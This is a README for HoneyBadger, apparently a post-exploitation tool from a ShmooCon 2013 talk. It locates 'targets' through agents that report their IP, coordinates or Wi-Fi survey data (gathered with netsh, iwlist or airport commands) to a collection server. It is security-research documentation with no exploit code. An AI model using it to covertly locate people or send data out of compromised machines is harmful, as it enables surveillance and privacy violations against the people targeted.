A framework for targeted geolocation.

As seen in the presentation "[Hide and Seek: Post-Exploitation Style](http://lanmaster53.com/talks/#shmoocon2013)" from ShmooCon 2013.

The associated Metasploit Framework modules can be found [here](https://github.com/v10l3nt/metasploit-framework/tree/master/modules/auxiliary/badger).

## Getting Started

### Pre-requisites

* PHP
* \*Python
* \*SQLite3

\*installed on most *nix platforms by default.

### Setup

1. Copy the contents of the repository into the server/virtual host web root.
2. Configure the web server/virtual host to restrict direct access to the "include", "data" and "admin" directories.
3. Initialize the database and logging system by visiting the UI in a browser.
4. Create a user with the "create_user.py" script in the admin directory. If this fails, it is most likely due to a missing pre-requisite or failure to do step 3.
5. Log in to the UI using the newly created account.

## API Usage

### IP Geolocation

This method geolocates the target based on the source IP of the request and assigns the resolved location to the given target and agent.

Example: (Method: GET)

```http://<path_to_honeybadger>/service.php?target=<target_name>&agent=<agent_name>```

### Known Coordinates

This method accepts previously resolved location data for the given target and agent.

Example: (Method: GET)

```http://<path_to_honeybadger>/service.php?target=<target_name>&agent=<agent_name>&lat=<latitude>&lng=<longitude>&acc=<accuracy>```

### Wireless Survey

This method accepts wireless survey data and parses the information on the server-side, extracting what is needed to make a Google API geolocation call. The resolved geolocation data is then assigned to the given target and agent. Parsers currently exist for survey data from Windows, Linux and OS X using the following commands:

Windows:

```cmd.exe /c netsh wlan show networks mode=bssid | findstr "SSID Signal"```

Linux:

```/bin/sh -c iwlist scan | egrep 'Address|ESSID|Signal'```

OS X:

```/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s```

Example: (Method: POST)

```http://<path_to_honeybadger>/service.php```

POST Payload:

```target=<target_name>&agent=<agent_name>&os=<operating_system>&data=<base64_data>```

### Universal Parameters

All requests can include an optional "comment" parameter. This parameter is sanitized and displayed within the UI as miscellaneous information about the target or agent.
